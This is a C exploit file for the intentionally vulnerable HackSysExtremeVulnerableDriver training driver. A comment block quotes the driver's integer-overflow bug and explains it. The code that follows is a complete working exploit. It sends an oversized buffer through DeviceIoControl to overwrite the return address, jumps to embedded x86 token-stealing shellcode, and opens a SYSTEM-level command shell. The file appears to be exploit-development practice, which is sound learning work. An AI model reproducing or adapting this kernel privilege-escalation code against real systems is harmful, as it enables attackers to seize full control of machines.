
/*

NTSTATUS TriggerIntegerOverflow(IN PVOID UserBuffer, IN SIZE_T Size) {
    ULONG Count = 0;
    NTSTATUS Status = STATUS_SUCCESS;
    ULONG BufferTerminator = 0xBAD0B0B0;
    ULONG KernelBuffer[BUFFER_SIZE] = {0};
    SIZE_T TerminatorSize = sizeof(BufferTerminator);
 
    PAGED_CODE();
 
    __try {
        // Verify if the buffer resides in user mode
        ProbeForRead(UserBuffer, sizeof(KernelBuffer), (ULONG)__alignof(KernelBuffer));
 
        DbgPrint("[+] UserBuffer: 0x%p\n", UserBuffer);
        DbgPrint("[+] UserBuffer Size: 0x%X\n", Size);
        DbgPrint("[+] KernelBuffer: 0x%p\n", &KernelBuffer);
        DbgPrint("[+] KernelBuffer Size: 0x%X\n", sizeof(KernelBuffer));
 
#ifdef SECURE
        // Secure Note: This is secure because the developer is not doing any arithmetic
        // on the user supplied value. Instead, the developer is subtracting the size of
        // ULONG i.e. 4 on x86 from the size of KernelBuffer. Hence, integer overflow will
        // not occur and this check will not fail
        if (Size > (sizeof(KernelBuffer) - TerminatorSize)) {
            DbgPrint("[-] Invalid UserBuffer Size: 0x%X\n", Size);
 
            Status = STATUS_INVALID_BUFFER_SIZE;
            return Status;
        }
#else
        DbgPrint("[+] Triggering Integer Overflow\n");
 
        // Vulnerability Note: This is a vanilla Integer Overflow vulnerability because if
        // 'Size' is 0xFFFFFFFF and we do an addition with size of ULONG i.e. 4 on x86, the
        // integer will wrap down and will finally cause this check to fail
        if ((Size + TerminatorSize) > sizeof(KernelBuffer)) {
            DbgPrint("[-] Invalid UserBuffer Size: 0x%X\n", Size);
 
            Status = STATUS_INVALID_BUFFER_SIZE;
            return Status;
        }
#endif
 
        // Perform the copy operation
        while (Count < (Size / sizeof(ULONG))) {
            if (*(PULONG)UserBuffer != BufferTerminator) {
                KernelBuffer[Count] = *(PULONG)UserBuffer;
                UserBuffer = (PULONG)UserBuffer + 1;
                Count++;
            }
            else {
                break;
            }
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }
 
    return Status;
}

'''
Obvious bug is obvious, the terminator size is 4 bytes so if we supply DeviceIoControl with a buffer size which
is between 0xfffffffc and 0xffffffff the driver will add 4 to the integer causing the value to loop round
on itself and pass the check.
'''

what he say'd + we can control the callback giving us control over the execution flow.


*/



#include <Windows.h>
#include <stdio.h>
#include <winioctl.h>
#include <stdint.h>
#include <malloc.h>

int main()
{
	HANDLE dev = CreateFileA(
		"\\\\.\\HackSysExtremeVulnerableDriver",
		FILE_READ_ACCESS | FILE_WRITE_ACCESS,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING, FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (dev == INVALID_HANDLE_VALUE) {
		return 1;
	}

	DWORD u = 0;
	
	char pl[66] = 
		"\x60" 
		"\x64\xA1\x24\x01\x00\x00" 
		"\x8B\x40\x50"
		"\x89\xC1"
		"\x8B\x98\xF8\x00\x00\x00" 
		"\xBA\x04\x00\x00\x00" 
		"\x8B\x80\xB8\x00\x00\x00" 
		"\x2D\xB8\x00\x00\x00" 
		"\x39\x90\xB4\x00\x00\x00" 
		"\x75\xED" 
		"\x8B\x90\xF8\x00\x00\x00" 
		"\x89\x91\xF8\x00\x00\x00" 
		"\x61"
		"\x31\xC0" 
		"\x5D" 
		"\xC2\x08\x00" 
		;
	LPVOID pla = VirtualAlloc(
		NULL,
		sizeof(pl),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);
	memcpy(pla, pl, sizeof(pl));
	LPVOID plAddress = &pla;
	byte Buff[0x830] = { 0 };

	memset(Buff,'\x90',0x830);
	memcpy(Buff + 0x828, plAddress, 4);
	memcpy(Buff + 0x830 - 4, "\xb0\xb0\xd0\xba", 4);

	DeviceIoControl(
		dev,
		0x222027,
		&Buff,
		0xFFFFFFFF,
		NULL,
		0,
		&u,
		(LPOVERLAPPED)NULL
	);
	system("cmd.exe");
	CloseHandle(dev);
	system("pause");
	return 0;
}
